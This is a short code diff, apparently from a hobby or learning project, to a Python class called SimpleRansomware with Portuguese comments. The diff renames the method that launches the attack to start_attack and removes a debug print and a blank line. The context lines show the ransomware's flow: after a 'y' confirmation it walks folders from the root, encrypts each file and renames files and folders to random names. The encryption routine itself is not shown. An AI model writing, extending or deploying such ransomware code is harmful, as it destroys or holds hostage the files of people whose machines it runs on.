@@ -36,12 +36,12 @@ class SimpleRansomware:
 
     def check_danger_menu_option(self, option: str):
         if option == 'y':
-            self.start()
+            self.start_attack()
         else:
             print("Saindo...")
             sys.exit()
 
-    def start(self):
+    def start_attack(self):
         """ Inicia o ataque """
         folders = self.check_subfolders_in_root()
 
@@ -70,7 +70,6 @@ class SimpleRansomware:
         self.rename_item_to_random_name(folder)
 
     def attack_file_function(self, file_path: Path):
-
         self.encrypt_file(file_path)
         self.rename_item_to_random_name(file_path)
 
@@ -83,7 +82,6 @@ class SimpleRansomware:
 
     def rename_item_to_random_name(self, item_path: Path):
         """ Renomea o item com um nome randomico """
-        print(item_path)
         new_name = self.get_random_name()
         item_path.replace(new_name)
 
